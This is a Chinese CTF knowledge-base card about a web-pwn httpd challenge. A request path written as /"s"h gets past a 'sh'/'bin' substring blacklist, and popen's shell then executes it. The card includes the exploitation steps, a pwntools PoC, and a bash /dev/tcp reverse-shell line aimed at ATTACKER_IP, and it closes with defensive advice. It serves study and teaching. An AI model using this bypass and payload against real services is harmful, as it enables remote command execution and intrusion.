---
id: ctf-pwn-httpd-shell-quote-splice-sh-bin-filter-popen
title: web pwn httpd：请求路径 /"s"h 经 shell 引号删除拼成 /sh，绕过 "sh"/"bin" 子串黑名单并借 popen 的 sh 执行反弹 shell
type: scenario
domain: ctf
path: ctf/pwn
technique: shell-quote-splice-uri-sh-filter-bypass-popen
tags:
- ctf
- pwn
- web-pwn
- httpd
- command-injection
- shell-quote
- filter-bypass
- popen
- reverse-shell
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V272
  verified_at: '2026-11-08T00:16:24+08:00'
  notes: 已对照原文核对：whitelist 的 strchr 拒绝 & | ; $ { } ` 与 strstr 拒绝 sh/bin（原文 line 477-526）、popen 启动 sh 且 stdout/stderr 重定向 /dev/null（line 544-563）、exp GET /"s"h HTTP/1.0 后第二段 bash -c 反弹 shell（line 590-598）均与卡片一致；引号删除绕过 sh 子串与第二段不过滤的解释成立。单卡单一原子（过滤前字符串黑名单 + popen shell 引号拼接绕过），无需拆分。未验证点：原文未给出 popen 接收请求路径的完整源码与成功反弹截图，卡片 confidence medium，未本机复跑；/sh 存在性为挑战环境推断。dedup 仅自身草稿命中；同名候选 ctf-pwn-httpd-path-popen-command-injection 是另一道题（GET 路径 %20 注入 cp /flag 到 web 根，端口 32514），与本卡 33002/引号拼接/sh-bin 过滤不同，非重复；dup-scan 无本卡 pair。
url: /docs/ctf/pwn/ctf-pwn-httpd-shell-quote-splice-sh-bin-filter-popen/
draft: false
kb_aliases:
- /"s"h 绕过
- sh 关键字过滤绕过
- bin 子串过滤绕过
- 引号拼接执行 /sh
- popen sh stdin 注入
- 羊城杯 httpd
---

## 一句话结论

32 位 HTTP 服务用一个 `whitelist()` 对请求做黑名单：`strchr` 拒绝 `& | ; $ { } \``，`strstr` 拒绝子串 `sh` 与 `bin`；但过滤发生在 shell 解析之前，请求路径写成 `/"s"h` 时原字符串不含连续的 `sh`，通过校验后 `/bin/sh` 风格的引号删除会把它拼成 `/sh` 并执行。服务端用 `popen` 启动的 sh 接收该请求，随后的输入行（含 `&` 的反弹 shell 命令）不再经过过滤，直接由这个 sh 执行。

## 原理

- 过滤函数（32 位）逻辑：
  ```c
  if (strchr(a1, '&') || strchr(a1, '|') || strchr(a1, ';') ||
      strchr(a1, '$') || strchr(a1, '{') || strchr(a1, '}') ||
      strchr(a1, '`'))
      return 0;
  if (strstr(a1, "sh") || strstr(a1, "bin"))
      return 0;
  return 1;
  ```
  它检查的是**原始字节串**，不理解 shell 语法。
- shell 的命令解析顺序是：先做引号/转义处理（quote removal），再执行。`/"s"h` 的原始字符是 `/`、`"`、`s`、`"`、`h`，不存在连续子串 `sh`，所以 `strstr(a1, "sh")` 不命中；进入 `/bin/sh` 解析后引号被删除，`s` 与 `h` 拼接成 `/sh` 命令。
- 为什么不用 `/bin/sh`：`bin` 也被 `strstr` 拦截；而 `/sh` 不需要 `bin` 子串（挑战镜像中存在可执行的 `/sh`，常见于精简 rootfs / busybox 软链）。
- 为什么能执行反弹 shell：`popen` 启动的 shell 的 stdin 与请求输入相连（stdout/stderr 被 `freopen("/dev/null")` + `dup2` 重定向）。第一段请求只用来通过 `whitelist()` 并让 shell 执行 `/sh`；后续发送的 `bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"` 由新起的子 shell 从同一输入流读取，**不再经过 `whitelist()`**，因此其中的 `&`、`$` 等被禁字符可以出现。
- 该链成立的三个条件同时满足：黑名单基于原始字符串、过滤后才交给 shell 解析、以及存在第二段输入通道。

## 触发条件

- 服务端把用户可控的请求内容（本题为 HTTP 请求路径/请求行）送入 `popen` 启动的 shell，而不是用参数化 `execve`；
- 过滤在 shell 解析之前、且只做字符串 `strstr`/`strchr` 黑名单；
- 目标系统存在 `/sh`（或可用其他引号拼接方式得到等价 shell 路径）；
- 攻击者可保持连接，继续向该 sh 的 stdin 写入第二段命令。

## 利用步骤

1. 启动监听（如 `nc -lvnp 7777`）。
2. 发送第一段请求，路径用引号拼接避开 `sh` 子串：
   ```http
   GET /"s"h HTTP/1.0
   Host: 0.0.0.10
   Content-Length: 0
   ```
3. 服务端 `whitelist()` 通过；把请求交给 `popen` 的 sh 后，shell 将 `/"s"h` 解析为 `/sh` 并执行，得到一个从同一输入流读取命令的子 shell。
4. 继续发送第二段（不再经过过滤）：
   ```text
   bash -c "bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1"
   ```
5. 监听端获得反弹 shell。

## PoC

```python
from pwn import *
context(os='linux', arch='i386')
p = remote('target', 33002)

host = '0.0.0.10'
request  = 'GET /"s"h HTTP/1.0\r\n'
request += 'Host: ' + host + '\r\n'
request += 'Content-Length: 0\r\n'
p.sendline(request)

# 第二段命令不再经过 whitelist，可包含 &、$ 等被禁字符
p.sendline('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1"')
p.interactive()
```

## 变体与关联

- 变体：任意“引号/转义拼接后等于黑名单词”的形式，如 `/"s"h`、`/b"i"n/sh`、`fl''ag`；也可把 `sh` 拆成变量或通配符（若 `$`、`*` 未被禁）。
- 变体：若过滤只禁 `sh` 而放行 `$`，可改用 `$0` 拉起 shell（见 [[binary-pwn-rop-system-dollar0-bypass-sh-filter]]）；本题 `$` 被禁，所以用引号删除。
- 关联：[[ctf-pwn-command-injection-filename-shell-quote-bypass]] 是同一原理（过滤在 shell 解析前，`fl''ag` 绕过 `strstr(file,"flag")`），但 sink 是 `system("cat "+文件名)`；本卡 sink 是 HTTP 请求进入 `popen` 的 sh stdin，且额外利用第二段输入绕过元字符黑名单。
- 关联：[[binary-pwn-stack-ret2plt-system-sh-local-root-service]] 等 web/服务类 pwn 的控制流劫持卡，可对比“拿到 shell 后反弹”的收尾方式。

## 检测与防御

- 根本修复：不要把请求内容写入 `popen`/`system` 的 shell；用 `execve` + 参数数组执行固定程序。
- 过滤：不能基于原始字符串黑名单；如必须过滤，应先做 shell 词法归一化（去引号、去转义）再检查，并对允许字符做白名单（如仅 `[a-z0-9/._-]`）。
- 运行加固：服务降权运行；禁用 bash 的 `/dev/tcp`（`--disable-net-redirections`）；用 seccomp/AppArmor 限制出站网络与子进程。
- 监控：HTTP 请求路径中出现引号拼接、绝对路径 shell（`/sh`）及服务端产生异常子进程/外连时告警。
